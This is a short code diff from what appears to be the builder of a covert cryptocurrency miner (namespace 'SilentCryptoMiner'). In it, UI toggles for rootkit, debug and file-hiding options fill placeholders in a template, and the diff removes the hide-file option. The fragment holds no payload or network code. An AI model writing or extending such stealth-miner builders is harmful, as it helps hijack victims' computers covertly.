@@ -459,11 +459,6 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefRootkit", "true");
             }
 
-            if (F.toggleHideFile.Checked)
-            {
-                stringb.Replace("DefHideFile", "true");
-            }
-
             if (F.toggleDebug.Checked)
             {
                 stringb.Replace("DefDebug", "true");
